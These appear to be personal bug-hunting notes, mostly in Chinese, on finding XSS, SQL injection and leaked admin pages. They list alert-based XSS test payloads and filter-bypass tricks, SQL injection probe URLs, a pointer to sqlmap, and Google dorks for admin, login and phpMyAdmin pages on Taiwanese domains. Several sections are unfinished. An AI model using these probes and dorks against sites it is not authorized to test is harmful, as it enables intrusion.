# Web_Bug_Hunting

# XSS
跨站腳本攻擊是目前我尋找的網頁漏洞最多的之一，其中以反射型XSS為最大宗

心得與找security bug的方法:

1.找到注入點:

反射型XSS常出現在`搜尋框`、`url`、`登入頁面`**(出現在GET參數後機率高)**

儲存型XSS常出現在`留言板` **(可以用Google Hacking搜尋`intext:"留言板" AND site:xxx.xxx.xxx`、`intitle:"留言板 AND site:xxx.xxx.xxx"`)**

2.注入基本payload觀察回應:

我自己常用 **"><script>alert(1)</script>**，常會出現以下情況:

    - 直接噴alert框
    
    - <script>被擋掉 --> 
    
      換tag bypass (<iframe>、<img>)
      
      編碼 bypass (url encode、double url encode、html entities...)
      
      雙tag bypass (<scr<script>ipt>alert(1)</scr</script>ipt>)
      
      大小寫混和 bypass (<ScRiPt>alert(1)</ScRiPt>)
      
      雙tag + 大小寫混和 bypass (<ScR<script>IpT>)

3.利用**滑鼠右鍵** --> **檢查**，找出漏洞可能出現的地方，通常出現在網頁上

4.繼續依照source code修改payload，一邊必須觀察可能的filter，並靈活運用bypass

以下是我在找網頁漏洞時用過的payload
- "><script>alert(1)</script>
- '>alert(1)</script>
- <iframe onload="alert(1)"></iframe>
- 


# SQL injection

## test of SQL injection vulnerbility
http://example.com?id=--

http://example.com?id=' or 

http://example.com?id=%27

心得與找security bug的方法:

1.找到注入點:

SQL injection常出現在`搜尋框`、`url`、`登入頁面(有機會非法登入)`**(出現在GET參數後機率高)**

Google Hacking search for SQL injection Vulnerbility:


## bypass
> 幾乎跟XSS一樣 

## prove for SQL injection vulnerbility

sqlmap

# Information Leakage & search for vulnerbility
 - Google Haking search for Leakage
   - inurl:"admin"
   - inurl:"admin.php"
   - inurl:"login.php"
   - inurl:"phpMyAdmin"
   - inurl:"log"
   - inurl:
   - 運用inurl特性靈活過濾:臺灣domain:`inurl:.tw`

